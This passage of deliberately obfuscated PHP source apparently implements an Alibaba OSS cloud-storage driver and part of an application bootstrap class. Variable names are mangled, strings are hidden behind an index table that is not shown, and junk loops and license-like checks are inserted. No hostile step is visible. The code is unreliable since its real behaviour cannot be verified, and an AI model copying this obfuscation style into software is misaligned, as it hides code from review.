$ó„¦‘×É; } public function listPath($ê•óÕ·Ù, $ìøë¤†× = false) { $­¦–µÓÔ =& $_SERVER[Ñ¯©ç]; $ëéÃ‚ü = $this->fileList($ê•óÕ·Ù, $­¦–µÓÔ[8], !0); foreach ($ëéÃ‚ü[$­¦–µÓÔ[95]] as $‘»îüõª => $Ô˜Î¦‡ö) { $ëéÃ‚ü[$­¦–µÓÔ[95]][$‘»îüõª] = $this->folderInfo($Ô˜Î¦‡ö, $ìøë¤†×, $Ô˜Î¦‡ö); } foreach ($ëéÃ‚ü[$­¦–µÓÔ[96]] as $‘»îüõª => $Ô˜Î¦‡ö) { $ëéÃ‚ü[$­¦–µÓÔ[96]][$‘»îüõª] = $this->fileInfo($Ô˜Î¦‡ö[$­¦–µÓÔ[32]], $ìøë¤†×, $Ô˜Î¦‡ö); } return $ëéÃ‚ü; } protected function infoChildren($Œãà×‚, &$Şçô®µü) { $ˆÒßÈ³å =& $_SERVER[Ñ¯©ç]; $á™ñ€‘ = $this->fileList($Œãà×‚, $ˆÒßÈ³å[12], !0); $Şçô®µü[$ˆÒßÈ³å[91]] += count($á™ñ€‘[$ˆÒßÈ³å[95]]); $Şçô®µü[$ˆÒßÈ³å[90]] += count($á™ñ€‘[$ˆÒßÈ³å[96]]); foreach ($á™ñ€‘[$ˆÒßÈ³å[96]] as $Ãõ øÈ”) { if (!$Ãõ øÈ” || !$Ãõ øÈ”[$ˆÒßÈ³å[89]]) { continue; } $Şçô®µü[$ˆÒßÈ³å[89]] += $Ãõ øÈ”[$ˆÒßÈ³å[89]]; } } public function has($à×ã÷“, $ù¹ÀßÊ = false, $ÏÏÒûÈ = true) { $ó÷ó¯Ê´ =& $_SERVER[Ñ¯©ç]; $à×ã÷“ = trim($à×ã÷“, $ó÷ó¯Ê´[8]); $ªÓÁ¸å = empty($à×ã÷“) && $à×ã÷“ !== $ó÷ó¯Ê´[229] ? $ó÷ó¯Ê´[12] : $à×ã÷“ . $ó÷ó¯Ê´[8]; $‹çÃÙ¤Ï = $ó÷ó¯Ê´[12]; $çµ¢†¢© = 500; $‰«²Úò = $´†îš…¹ = 0; while (!0) { check_abort(); $Í¾™ø€ñ = array($ó÷ó¯Ê´[1445] => $ó÷ó¯Ê´[8], $ó÷ó¯Ê´[1446] => $ªÓÁ¸å, $ó÷ó¯Ê´[1447] => $çµ¢†¢©, $ó÷ó¯Ê´[1448] => $‹çÃÙ¤Ï); try { $‚Áˆïˆû = $this->client->listObjects($this->bucket, $Í¾™ø€ñ); } catch (OSS\Core\OssException $«ãÉ£™Ø) { $this->writeLog(__FUNCTION__ . $ó÷ó¯Ê´[215] . $«ãÉ£™Ø->getMessage()); break; } $‹çÃÙ¤Ï = $‚Áˆïˆû->getNextMarker(); $—ô¹¯øÂ = $‚Áˆïˆû->getObjectList(); $§Å¾«ÜÂ = $‚Áˆïˆû->getPrefixList(); if ($ù¹ÀßÊ) { if (count($—ô¹¯øÂ) > 1 || count($—ô¹¯øÂ) == 1 && $—ô¹¯øÂ[0]->getKey() != $ªÓÁ¸å) { $‰«²Úò += count($—ô¹¯øÂ) - 1; } if (!empty($§Å¾«ÜÂ)) { $´†îš…¹ += count($§Å¾«ÜÂ); } if ($‹çÃÙ¤Ï === $ó÷ó¯Ê´[12]) { break; } continue; } if ($ÏÏÒûÈ) { if (!empty($—ô¹¯øÂ)) { if (count($—ô¹¯øÂ) > 1 || $—ô¹¯øÂ[0]->getKey() != $ªÓÁ¸å) { return !0; } } } else { if (!empty($§Å¾«ÜÂ)) { return !0; } } if ($‹çÃÙ¤Ï === $ó÷ó¯Ê´[12]) { break; } } if ($ù¹ÀßÊ) { return array($ó÷ó¯Ê´[240] => $‰«²Úò, $ó÷ó¯Ê´[241] => $´†îš…¹); } return !1; } public function listAll($ÆÙµòªÊ) { $ÁŞ§öÉç =& $_SERVER[Ñ¯©ç]; $ğâ¶§Ú‘ = $this->fileList($ÆÙµòªÊ, $ÁŞ§öÉç[12], !0); $£ó¶È†© = array_to_keyvalue($ğâ¶§Ú‘[$ÁŞ§öÉç[96]], $ÁŞ§öÉç[32]); foreach ($ğâ¶§Ú‘[$ÁŞ§öÉç[95]] as $ô è¨û°) { if (is_string($ô è¨û°)) { $£ó¶È†©[$ô è¨û°] = array($ÁŞ§öÉç[89] => 0); } } return $this->listAllFiles($ÆÙµòªÊ, $£ó¶È†©); } public function canRead($Í½ú•Ş) { $ÛìÕ—Ş =& $_SERVER[Ñ¯©ç]; $Ñõ›¿õı = $this->pathAcl($Í½ú•Ş); return $Ñõ›¿õı == $ÛìÕ—Ş[1459] || $Ñõ›¿õı == $ÛìÕ—Ş[602] ? !0 : !1; } public function canWrite($¡õ³®Ÿ¡) { $Ì–«¯¹œ = $this->pathAcl($¡õ³®Ÿ¡); return $Ì–«¯¹œ == $_SERVER[Ñ¯©ç][602] ? !0 : !1; } public function pathAcl($¯Üì¬‰) { $âş…ˆ¯Ô =& $_SERVER[Ñ¯©ç]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $¸‘Ë»±î = $this->client->getObjectAcl($this->bucket, $this->pathEncode($¯Üì¬‰)); } catch (OSS\Core\OssException $Ú¢Ê‡‡Ù) { $this->writeLog(__FUNCTION__ . $âş…ˆ¯Ô[215] . $Ú¢Ê‡‡Ù->getMessage()); return !1; } $Ã¶ÆÌÒë = $¸‘Ë»±î == $âş…ˆ¯Ô[37] ? $this->bucketAcl : $¸‘Ë»±î; if ($Ã¶ÆÌÒë == $âş…ˆ¯Ô[1460]) { return $âş…ˆ¯Ô[1459]; } if ($Ã¶ÆÌÒë == $âş…ˆ¯Ô[1461]) { return $âş…ˆ¯Ô[602]; } return $Ã¶ÆÌÒë; } private function chmodPath($÷’Âçœâ, $•İœø§Î = '') { $¢Ù¨ÊÀ =& $_SERVER[Ñ¯©ç]; $°şü¥© = empty($•İœø§Î) ? $¢Ù¨ÊÀ[1461] : $•İœø§Î; $£«ãõÁ‚ = array($¢Ù¨ÊÀ[37], $¢Ù¨ÊÀ[230], $¢Ù¨ÊÀ[1460], $¢Ù¨ÊÀ[1461]); if (!in_array($°şü¥©, $£«ãõÁ‚)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($÷’Âçœâ), $°şü¥©); } catch (OSS\Core\OssException $Ìú†úë) { $this->writeLog(__FUNCTION__ . $¢Ù¨ÊÀ[215] . $Ìú†úë->getMessage()); return !1; } return !0; } public function getContent($€ß·¬ò) { return $this->fileSubstr($€ß·¬ò, -1); } public function setContent($’‰ìªÆ, $ûèí›’ = '') { $™çæÍ¶„ =& $_SERVER[Ñ¯©ç]; try { $û”Ó³ïµ = $this->trafficLimit($™çæÍ¶„[1462]); $µğœò— = $this->client->putObject($this->bucket, $this->pathEncode($’‰ìªÆ), $ûèí›’, $û”Ó³ïµ); } catch (OSS\Core\OssException $Ò³×­ĞÑ) { $this->writeLog(__FUNCTION__ . $™çæÍ¶„[215] . $Ò³×­ĞÑ->getMessage()); return !1; } $ò©±†ÌÑ = array($™çæÍ¶„[1452] => trim($µğœò—[$™çæÍ¶„[1449]], $™çæÍ¶„[131]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($’‰ìªÆ))); $this->updateObjMeta($’‰ìªÆ, $ò©±†ÌÑ); return isset($µğœò—[$™çæÍ¶„[1463]][$™çæÍ¶„[292]]) ? !0 : !1; } private function updateObjMeta($“é–ì¢¦, $ËçŞ¥„Ã) { $“é–ì¢¦ = $this->pathEncode($“é–ì¢¦); try { $ïûî˜» = array(OSS\OssClient::OSS_HEADERS => $ËçŞ¥„Ã); $this->client->copyObject($this->bucket, $“é–ì¢¦, $this->bucket, $“é–ì¢¦, $ïûî˜»); } catch (OSS\Core\OssException $º©§æ€) { $this->writeLog(__FUNCTION__ . $_SERVER[Ñ¯©ç][215] . $º©§æ€->getMessage()); return !1; } return !0; } public function upload($¦‹”†ë, $ö´Â¹è†, $ÌŒëêìÌ = false, $íú‹ç·Ö = REPEAT_REPLACE) { $ÉöÊê¿ø =& $_SERVER[Ñ¯©ç]; $¸œ—èÒè = trim($¦‹”†ë, $ÉöÊê¿ø[8]); $£¶úÊ¨Ê = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ÉöÊê¿ø[1452] => @md5_file($ö´Â¹è†)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¦‹”†ë))); $£¶úÊ¨Ê = $this->trafficLimit($ÉöÊê¿ø[1462], $£¶úÊ¨Ê); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($¸œ—èÒè), $ö´Â¹è†, $£¶úÊ¨Ê); } catch (OSS\Core\OssException $ÊŒ¬Å ò) { $this->writeLog(__FUNCTION__ . $ÉöÊê¿ø[215] . $ÊŒ¬Å ò->getMessage()); return !1; } return $this->getPathOuter($¦‹”†ë); } public function getHost() { $¾Î¢ı®ã =& $_SERVER[Ñ¯©ç]; $åÎ¯¬àˆ = explode($¾Î¢ı®ã[211], parent::getHost()); return $åÎ¯¬àˆ[0] . $¾Î¢ı®ã[211] . $this->bucket . $¾Î¢ı®ã[10] . $åÎ¯¬àˆ[1]; } public function uploadFormData($ »’ìÑ, $óòÉëÑ = 3600) { $ÍÏâ¶¸£ =& $_SERVER[Ñ¯©ç]; if (!($´Êºèö£ = $this->getHost())) { return !1; } $ŸŒ§Åªâ = $óòÉëÑ; $í•ÌèÙş = date($ÍÏâ¶¸£[1464], time() + $ŸŒ§Åªâ); $·¬ò÷†â = new DateTime($í•ÌèÙş); $ŞóÖŒ€À = $·¬ò÷†â->format(DateTime::ISO8601); $ şÇ×Ë¾ = strpos($ŞóÖŒ€À, $ÍÏâ¶¸£[356]); $ŞóÖŒ€À = substr($ŞóÖŒ€À, 0, $ şÇ×Ë¾) . $ÍÏâ¶¸£[1465]; $Ë³Õ×ú = 1048576000 * 5; $¨ÜğøÒ = $this->pathFather($ »’ìÑ); $Ø¤şÙ¿ı = array($ÍÏâ¶¸£[275] => $ŞóÖŒ€À, $ÍÏâ¶¸£[278] => array(array($ÍÏâ¶¸£[1466], 0, $Ë³Õ×ú), array($ÍÏâ¶¸£[281], $ÍÏâ¶¸£[282], $¨ÜğøÒ))); $÷ôäÙı¡ = base64_encode(json_encode($Ø¤şÙ¿ı)); $½ÂÆİß = base64_encode(hash_hmac($ÍÏâ¶¸£[263], $÷ôäÙı¡, $this->secret, !0)); $Ş Ùò¯› = array($ÍÏâ¶¸£[293] => $÷ôäÙı¡, $ÍÏâ¶¸£[1467] => $this->accessKey, $ÍÏâ¶¸£[285] => $ÍÏâ¶¸£[274], $ÍÏâ¶¸£[1468] => $½ÂÆİß, $ÍÏâ¶¸£[209] => $´Êºèö£); $Ş Ùò¯› = $this->trafficLimit($ÍÏâ¶¸£[1462], $Ş Ùò¯›); return $Ş Ùò¯›; } public function multiUploadFormData($Æ¦¬Ø´€, $ê¡ÇèÕæ = 3600) { $º¯Á«úÅ =& $_SERVER[Ñ¯©ç]; if (!($ù€‚‘Ÿš = $this->getHost())) { return !1; } $°äî³ƒ = $this->trafficLimit($º¯Á«úÅ[1462]); $ñ“•ª¦æ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Æ¦¬Ø´€), $°äî³ƒ); return array($º¯Á«úÅ[255] => $ñ“•ª¦æ, $º¯Á«úÅ[209] => $ù€‚‘Ÿš . $º¯Á«úÅ[8] . $this->pathEncode($Æ¦¬Ø´€), $º¯Á«úÅ[256] => gmdate($º¯Á«úÅ[1469]), $º¯Á«úÅ[107] => $Æ¦¬Ø´€); } public function multiUploadAuthData($æ¶ô—, $¬ú¡àèÀ = array()) { $´Š»ËÂã =& $_SERVER[Ñ¯©ç]; $á» ŸÓ = isset($¬ú¡àèÀ[$´Š»ËÂã[256]]) ? $¬ú¡àèÀ[$´Š»ËÂã[256]] : gmdate($´Š»ËÂã[1469]); $Ç†ñ­¸˜ = isset($¬ú¡àèÀ[$´Š»ËÂã[188]]) ? $¬ú¡àèÀ[$´Š»ËÂã[188]] : $´Š»ËÂã[12]; $ÆÃÕÏùÃ = $æ¶ô—; if (isset($¬ú¡àèÀ[$´Š»ËÂã[107]])) { $ÆÃÕÏùÃ = $¬ú¡àèÀ[$´Š»ËÂã[107]]; unset($¬ú¡àèÀ[$´Š»ËÂã[107]]); } if (isset($¬ú¡àèÀ[$´Š»ËÂã[257]])) { $¬ú¡àèÀ[$´Š»ËÂã[256]] = $á» ŸÓ; return $this->listUploadParts($ÆÃÕÏùÃ, $¬ú¡àèÀ); } $ıÉÚ’êÈ = array($´Š»ËÂã[258], $´Š»ËÂã[12], $´Š»ËÂã[133], $á» ŸÓ, "\x78\x2d\x6f\x73\163\55\144\141\x74\x65\x3a{$á» ŸÓ}", $´Š»ËÂã[8] . $this->bucket . $´Š»ËÂã[8] . $ÆÃÕÏùÃ . $Ç†ñ­¸˜); if (strpos($Ç†ñ­¸˜, $´Š»ËÂã[259]) === 0) { $ıÉÚ’êÈ[0] = $´Š»ËÂã[260]; if ($Ã˜÷åµ˜ = $this->trafficLimit($´Š»ËÂã[1462])) { $ÆÃÕÏùÃ = $´Š»ËÂã[1470]; array_splice($ıÉÚ’êÈ, 5, 0, $ÆÃÕÏùÃ . $´Š»ËÂã[4] . $Ã˜÷åµ˜[$ÆÃÕÏùÃ]); } } if (isset($¬ú¡àèÀ[$´Š»ËÂã[261]]) && $¬ú¡àèÀ[$´Š»ËÂã[261]] == $´Š»ËÂã[262]) { $ıÉÚ’êÈ[0] = $´Š»ËÂã[262]; } if (!empty($¬ú¡àèÀ[$´Š»ËÂã[1471]])) { $›ê¦¥«¯ = array_merge(array($ıÉÚ’êÈ[4]), $¬ú¡àèÀ[$´Š»ËÂã[1471]]); sort($›ê¦¥«¯); $ıÉÚ’êÈ[4] = implode($´Š»ËÂã[59], $›ê¦¥«¯); } $èÚì½û = implode($´Š»ËÂã[59], $ıÉÚ’êÈ); $ù—Æàõ = base64_encode(hash_hmac($´Š»ËÂã[263], $èÚì½û, $this->secret, !0)); $ï®ÓØ¢¢ = $´Š»ËÂã[1435] . $this->accessKey . $´Š»ËÂã[4] . $ù—Æàõ; if (strpos($Ç†ñ­¸˜, $´Š»ËÂã[259]) === 0) { $ï®ÓØ¢¢ = array($´Š»ËÂã[265] => $ï®ÓØ¢¢, $´Š»ËÂã[256] => $á» ŸÓ); if ($Ã˜÷åµ˜) { $ï®ÓØ¢¢ = array_merge($ï®ÓØ¢¢, $Ã˜÷åµ˜); } } return $ï®ÓØ¢¢; } public function listUploadParts($ìŒ¼Ÿ§Æ, $ÍÈ‰ôÉ) { $·•À¯´Ú =& $_SERVER[Ñ¯©ç]; $÷ßóæ‘È = parse_url_query($ÍÈ‰ôÉ[$·•À¯´Ú[188]]); $­Í°Ü»¼ = $this->client->listParts($this->bucket, $this->pathEncode($ìŒ¼Ÿ§Æ), $÷ßóæ‘È[$·•À¯´Ú[255]]); $Æ¼ãíØï = $­Í°Ü»¼->getListPart(); $´£³çŠÁ = array(); foreach ($Æ¼ãíØï as $ŠïåšÓ÷) { $´£³çŠÁ[] = array($·•À¯´Ú[1456] => $ŠïåšÓ÷->getPartNumber(), $·•À¯´Ú[1457] => trim($ŠïåšÓ÷->getETag(), $·•À¯´Ú[131])); } unset($ÍÈ‰ôÉ[$·•À¯´Ú[257]], $ÍÈ‰ôÉ[$·•À¯´Ú[261]]); $´‡ üŒÚ = $this->multiUploadAuthData($ìŒ¼Ÿ§Æ, $ÍÈ‰ôÉ); if (empty($´‡ üŒÚ)) { return !1; } return array($·•À¯´Ú[265] => $´‡ üŒÚ, $·•À¯´Ú[256] => $ÍÈ‰ôÉ[$·•À¯´Ú[256]], $·•À¯´Ú[267] => $´£³çŠÁ); } public function download($Ğ†”ëŞã, $êò•¾¦…) { $îøŠ…íÊ =& $_SERVER[Ñ¯©ç]; if ($this->isFolder($Ğ†”ëŞã)) { return !1; } try { $Õç¢¢ƒ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $êò•¾¦…); $Õç¢¢ƒ = $this->trafficLimit($îøŠ…íÊ[122], $Õç¢¢ƒ); $this->client->getObject($this->bucket, $this->pathEncode($Ğ†”ëŞã), $Õç¢¢ƒ); } catch (OSS\Core\OssException $Ï›³šæ’) { $this->writeLog(__FUNCTION__ . $îøŠ…íÊ[215] . $Ï›³šæ’->getMessage()); return !1; } return $êò•¾¦…; } public function fileSubstr($æ Ã° ú, $÷÷¾Áˆ¢ = 0, $ó²¿·¼ = false) { if ($÷÷¾Áˆ¢ === -1) { $É¶›Á· = array(); } else { if ($ó²¿·¼ === !1) { $“×ÑÉãà = $this->size($æ Ã° ú); } else { $“×ÑÉãà = $÷÷¾Áˆ¢ + $ó²¿·¼ - 1; } $É¶›Á· = array(OSS\OssClient::OSS_RANGE => "{$÷÷¾Áˆ¢}\x2d{$“×ÑÉãà}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($æ Ã° ú), $É¶›Á·); } catch (OSS\Core\OssException $¨àïöÖŸ) { $this->writeLog(__FUNCTION__ . $_SERVER[Ñ¯©ç][215] . $¨àïöÖŸ->getMessage()); think_exception($¨àïöÖŸ->getMessage()); return !1; } } private function trafficLimit($•ìòì, $µš‰µ’ˆ = array()) { $òŒ¾¾Ú =& $_SERVER[Ñ¯©ç]; if ($•ìòì == $òŒ¾¾Ú[1462] && $this->isUploadServer() || $•ìòì == $òŒ¾¾Ú[122] && $this->isFileOutServer()) { return $µš‰µ’ˆ; } $‡ÓÂ‡Ñ = floatval($GLOBALS[$òŒ¾¾Ú[6]][$òŒ¾¾Ú[102]][$òŒ¾¾Ú[120]][$•ìòì]) * 1024 * 1024 * 8; if (!$‡ÓÂ‡Ñ) { return $µš‰µ’ˆ; } $‡ÓÂ‡Ñ = $‡ÓÂ‡Ñ < 819200 ? 819200 : ($‡ÓÂ‡Ñ > 838860800 ? 838860800 : $‡ÓÂ‡Ñ); $µš‰µ’ˆ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($‡ÓÂ‡Ñ); return $µš‰µ’ˆ; } public function link($Š¼Éˆ­, $æ‘¾áåê = array()) { $ıË·İï =& $_SERVER[Ñ¯©ç]; if (!$this->exist($Š¼Éˆ­) || $this->isFolder($Š¼Éˆ­)) { return !1; } try { $æ‘¾áåê = $this->trafficLimit($ıË·İï[122], $æ‘¾áåê); $˜ñøÛ¡¯ = $this->client->signUrl($this->bucket, $this->pathEncode($Š¼Éˆ­), 3600 * 12, $ıË·İï[262], $æ‘¾áåê); return $this->getCdnLink($˜ñøÛ¡¯); } catch (OSS\Core\OssException $‘İÖÌ¢) { $this->writeLog(__FUNCTION__ . $ıË·İï[215] . $‘İÖÌ¢->getMessage()); return !1; } } public function fileOut($ã´Šáµ¶, $³ƒÒ€Çà = false, $î•”àÎí = false, $ãíòå”å = '') { $ïÕ¥ú½Ø =& $_SERVER[Ñ¯©ç]; if ($this->isFileOutServer()) { return $this->fileOutServer($ã´Šáµ¶, $³ƒÒ€Çà, $î•”àÎí, $ãíòå”å); } if (!$î•”àÎí) { $î•”àÎí = $this->pathThis($ã´Šáµ¶); } $î•”àÎí = rawurlencode($î•”àÎí); $æÖÚ¾ğ¬ = get_file_mime(get_path_ext($î•”àÎí)); if ($æÖÚ¾ğ¬ == $ïÕ¥ú½Ø[249]) { return parent::fileOut($ã´Šáµ¶, $³ƒÒ€Çà, $î•”àÎí, $ãíòå”å); } $³ƒÒ€Çà = $³ƒÒ€Çà ? $ïÕ¥ú½Ø[1472] : $ïÕ¥ú½Ø[1473]; $ñú£Î×é = array(OSS\OssClient::OSS_SUB_RESOURCE => $ïÕ¥ú½Ø[1474] . rawurlencode("{$³ƒÒ€Çà}\x3b\146\151\154\145\156\x61\x6d\145\75{$î•”àÎí}")); $ñú£Î×é[OSS\OssClient::OSS_SUB_RESOURCE] .= $ïÕ¥ú½Ø[1475] . rawurlencode($æÖÚ¾ğ¬); $Âøà™ÚÄ = $this->link($ã´Šáµ¶, $ñú£Î×é); $this->fileOutLink($Âøà™ÚÄ); } public function fileOutServer($—£…°‘Ê, $ÊÌ×Ğâ„ = false, $çè÷Ëş = false, $ìÅöµè = '') { parent::fileOut($—£…°‘Ê, $ÊÌ×Ğâ„, $çè÷Ëş, $ìÅöµè); } public function fileOutImage($ÄÌğ©èô, $’Ôà¹À° = 250) { if ($this->size($ÄÌğ©èô) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ÄÌğ©èô, $’Ôà¹À°); } $º¨›—Ä = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Ñ¯©ç][1432] . $’Ôà¹À°); $»¦›¸• = $this->link($ÄÌğ©èô, $º¨›—Ä); $this->fileOutLink($»¦›¸•); } public function fileOutImageServer($¥‰Ãö¹, $ÊŠ™ÒŞÌ = 250) { parent::fileOutImage($¥‰Ãö¹, $ÊŠ™ÒŞÌ); } public function fileOutLink($Ñà²‰€ã) { $°Î«¤Âş =& $_SERVER[Ñ¯©ç]; if (!$this->isCdnHost() && substr($Ñà²‰€ã, 0, 7) == $°Î«¤Âş[1381]) { $Ñà²‰€ã = $°Î«¤Âş[1382] . substr($Ñà²‰€ã, 7); } header($°Î«¤Âş[175] . $Ñà²‰€ã); die; } public function hashMd5($¤³®éœ , $±àåè÷î = '') { $ş›€ùÏŞ =& $_SERVER[Ñ¯©ç]; $Òœâ¦òû = $this->_objectMeta($¤³®éœ ); if (!$Òœâ¦òû) { return $ş›€ùÏŞ[12]; } if (!isset($Òœâ¦òû[$ş›€ùÏŞ[1452]]) && !empty($±àåè÷î)) { $è­Ç¨® = $this->updateObjMeta($¤³®éœ , array($ş›€ùÏŞ[1452] => $±àåè÷î)); $Òœâ¦òû[$ş›€ùÏŞ[1452]] = $è­Ç¨® ? $±àåè÷î : $ş›€ùÏŞ[12]; } return isset($Òœâ¦òû[$ş›€ùÏŞ[1452]]) ? strtolower($Òœâ¦òû[$ş›€ùÏŞ[1452]]) : $ş›€ùÏŞ[12]; } public function size($Ÿ‡È´‘­) { $â”Ú¥‘æ = $this->objectMeta($Ÿ‡È´‘­); return $â”Ú¥‘æ ? $â”Ú¥‘æ[$_SERVER[Ñ¯©ç][89]] : 0; } public function info($»ş×úŸø) { if ($this->isFolder($»ş×úŸø)) { return $this->folderInfo($»ş×úŸø); } else { if ($this->isFile($»ş×úŸø)) { return $this->fileInfo($»ş×úŸø); } } return !1; } public function exist($ÄÏçîÇ¨) { return $this->isFile($ÄÏçîÇ¨) || $this->isFolder($ÄÏçîÇ¨); } public function isFile($·¿Ñ­è) { return !$this->isFolder($·¿Ñ­è) && $this->objectMeta($·¿Ñ­è); } public function isFolder($ÌîÊåô¯) { return $this->cacheMethod($_SERVER[Ñ¯©ç][179], $ÌîÊåô¯); } protected function objectMeta($†•Üû·‡) { return $this->cacheMethod($_SERVER[Ñ¯©ç][181], $†•Üû·‡); } protected function _objectMeta($ª´Â²¬) { $ä§·Ïû› =& $_SERVER[Ñ¯©ç]; try { $ÛÀ¦ƒÈ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ª´Â²¬)); } catch (OSS\Core\OssException $Êàü§—¼) { $this->writeLog(__FUNCTION__ . $ä§·Ïû›[215] . $Êàü§—¼->getMessage()); $ÛÀ¦ƒÈ = !1; } if ($ÛÀ¦ƒÈ) { $ÛÀ¦ƒÈ[$ä§·Ïû›[89]] = intval($ÛÀ¦ƒÈ[$ä§·Ïû›[1450]]); } return $ÛÀ¦ƒÈ; } protected function _isFolder($ÇªÉñ„) { $¥…½‘ç =& $_SERVER[Ñ¯©ç]; if ($ÇªÉñ„ == $¥…½‘ç[12] || $ÇªÉñ„ == $¥…½‘ç[8]) { return !0; } $»îç‘ø = array($¥…½‘ç[1445] => $¥…½‘ç[8], $¥…½‘ç[1446] => rtrim($ÇªÉñ„, $¥…½‘ç[8]) . $¥…½‘ç[8], $¥…½‘ç[1447] => 1, $¥…½‘ç[1448] => $¥…½‘ç[12]); $›Ç‰è» = $this->client->listObjects($this->bucket, $»îç‘ø); if ($›Ç‰è»->getObjectList() || $›Ç‰è»->getPrefixList()) { return !0; } return !1; } public function writeLog($¬îƒÎ³¤ = '', $éÎ§Úß = false) { $€ë¶ŒÙÖ =& $_SERVER[Ñ¯©ç]; $äŞ¯«ù = in_array(ACTION, array($€ë¶ŒÙÖ[213], $€ë¶ŒÙÖ[214])); if (!$äŞ¯«ù && !GLOBAL_DEBUG) { return; } $ğ¢ÆÜ« = 0; if (stripos($¬îƒÎ³¤, $€ë¶ŒÙÖ[1476]) !== !1) { $ğ¢ÆÜ« = 1; $¶®±ƒ½… = explode($€ë¶ŒÙÖ[1477], $¬îƒÎ³¤); $¬îƒÎ³¤ = !empty($¶®±ƒ½…[1]) ? $¶®±ƒ½…[1] : $¬îƒÎ³¤; } else { if (stripos($¬îƒÎ³¤, $€ë¶ŒÙÖ[1478])) { $ğ¢ÆÜ« = 2; $¶®±ƒ½… = explode($€ë¶ŒÙÖ[1478], $¬îƒÎ³¤); $¶®±ƒ½… = explode($€ë¶ŒÙÖ[4], $¶®±ƒ½…[0]); $¬îƒÎ³¤ = !empty($¶®±ƒ½…[1]) ? $¶®±ƒ½…[1] : $¬îƒÎ³¤; } } if ($äŞ¯«ù && I18n::getType() == $€ë¶ŒÙÖ[1479]) { if ($ğ¢ÆÜ« == 1) { $¬îƒÎ³¤ = str_replace($€ë¶ŒÙÖ[1480], $€ë¶ŒÙÖ[1481], $¬îƒÎ³¤); } else { if ($ğ¢ÆÜ« == 2) { $¶®±ƒ½… = explode($€ë¶ŒÙÖ[215], $¶®±ƒ½…[0]); $èíÓ×›û = isset($¶®±ƒ½…[1]) ? $¶®±ƒ½…[1] : $€ë¶ŒÙÖ[12]; $©–ëÒñÅ = array($€ë¶ŒÙÖ[1482] => $€ë¶ŒÙÖ[1483], $€ë¶ŒÙÖ[1484] => $€ë¶ŒÙÖ[1485], $€ë¶ŒÙÖ[1486] => $€ë¶ŒÙÖ[1487], $€ë¶ŒÙÖ[1488] => $€ë¶ŒÙÖ[1489], $€ë¶ŒÙÖ[1490] => $€ë¶ŒÙÖ[1491], $€ë¶ŒÙÖ[1492] => $€ë¶ŒÙÖ[1493], $€ë¶ŒÙÖ[1494] => $€ë¶ŒÙÖ[1495], $€ë¶ŒÙÖ[1496] => $€ë¶ŒÙÖ[1497], $€ë¶ŒÙÖ[1498] => $€ë¶ŒÙÖ[1499], $€ë¶ŒÙÖ[1500] => $€ë¶ŒÙÖ[1501]); if (isset($©–ëÒñÅ[$èíÓ×›û])) { $¬îƒÎ³¤ = $©–ëÒñÅ[$èíÓ×›û]; } } } if (stripos($¬îƒÎ³¤, $€ë¶ŒÙÖ[1502])) { $¬îƒÎ³¤ = $€ë¶ŒÙÖ[1503]; } } if (!trim($¬îƒÎ³¤)) { return; } parent::writeLog(trim($¬îƒÎ³¤), $éÎ§Úß); } } goto C´‚ŠÚ‹áÊ; Bâ‹ôÃ¹ÄË: class Application { private $defaultModule = "\x69\x6e\x64\145\170"; private $defaultController = "\151\156\144\145\170"; private $defaultAction = "\x69\156\x64\145\170"; function __construct() { } public function setDefault($©ï¦ó«ğ) { $Ï¶Ú¯ÌÆ =& $_SERVER[Ñ¯©ç]; $›ÅŞ¾  =& $_SERVER[‚Õ“‡ÑÇ]; $×÷Æ¢£â = explode($›ÅŞ¾ [0], trim($©ï¦ó«ğ, $›ÅŞ¾ [0])); $šÚÂÒ¿ = $Ï¶Ú¯ÌÆ[667]; $this->defaultModule = $×÷Æ¢£â[0] ? $×÷Æ¢£â[0] : $this->defaultModule; $this->defaultController = $×÷Æ¢£â[1] ? $×÷Æ¢£â[1] : $this->defaultController; $this->defaultAction = $×÷Æ¢£â[2] ? $×÷Æ¢£â[2] : $this->defaultAction; $«–Šıë = $Ï¶Ú¯ÌÆ[668]; if (!$«–Šıë) { return; } $this->inwd612ff29c($›ÅŞ¾ [1], array($this, $›ÅŞ¾ [2])); } public function appRun($¤ş½Íù–) { $¯ì ±‘± =& $_SERVER[Ñ¯©ç]; $ˆº²…˜¦ =& $_SERVER[‚Õ“‡ÑÇ]; $æ€ƒâ†â = explode($ˆº²…˜¦[0], $¤ş½Íù–); $‹‚¹é‰æ = strtolower($æ€ƒâ†â[0]); $«–„¶‚ = $¯ì ±‘±[669]; while ($«–„¶‚ < $¯ì ±‘±[60]) { if ($«–„¶‚ >= 0) { break; } $«–„¶‚++; } $Ù«½—Îß = $ˆº²…˜¦[3]; $–ƒúí¬ = $¯ì ±‘±[670]; if (strlen($–ƒúí¬) < $¯ì ±‘±[663]) { die; } if ($‹‚¹é‰æ == $ˆº²…˜¦[4]) { $Ù«½—Îß = $ˆº²…˜¦[5]; $æ€ƒâ†â[0] = $ˆº²…˜¦[6]; $æ€ƒâ†â[1] = $æ€ƒâ†â[1] . $ˆº²…˜¦[7]; $¤ş½Íù– = join($ˆº²…˜¦[0], $æ€ƒâ†â); $¤ş½Íù– = trim($¤ş½Íù–, $ˆº²…˜¦[0]); } call_user_func(array($ˆº²…˜¦[8], $ˆº²…˜¦[9]), $Ù«½—Îß . $ˆº²…˜¦[10], $¤ş½Íù–); ActionCall($¤ş½Íù–); $âÉöÑÉ = $¯ì ±‘±[671]; while (strlen($âÉöÑÉ) < $¯ì ±‘±[663]) { if (!$âÉöÑÉ) { break; } $âÉöÑÉ++; } call_user_func(array($ˆº²…˜¦[8], $ˆº²…˜¦[9]), $Ù«½—Îß . $ˆº²…˜¦[11], $¤ş½Íù–); $øæÄÄ…Â = $¯ì ±‘±[672]; while ($øæÄÄ…Â < 